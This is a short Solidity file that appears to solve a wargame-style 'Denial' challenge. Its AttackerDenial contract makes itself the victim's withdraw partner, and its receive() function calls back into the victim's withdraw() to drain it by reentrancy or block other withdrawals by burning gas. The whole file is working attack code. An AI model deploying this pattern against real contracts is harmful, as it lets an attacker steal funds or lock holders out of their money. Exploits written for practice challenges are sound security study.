// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IDenial {
  function setWithdrawPartner(address _partner) external;

    // withdraw 1% to recipient and 1% to owner
    function withdraw() external;


    // convenience function
    function contractBalance() external view returns (uint);
}


contract AttackerDenial{

    IDenial victim;

    constructor(address _victim) {
        victim = IDenial(_victim);
    }

    receive() external payable {
        victim.withdraw();
    }

    function attack() public {
        //Needs to be triggered 10 times in 10 different blocks
        victim.setWithdrawPartner(address(this));
    }
}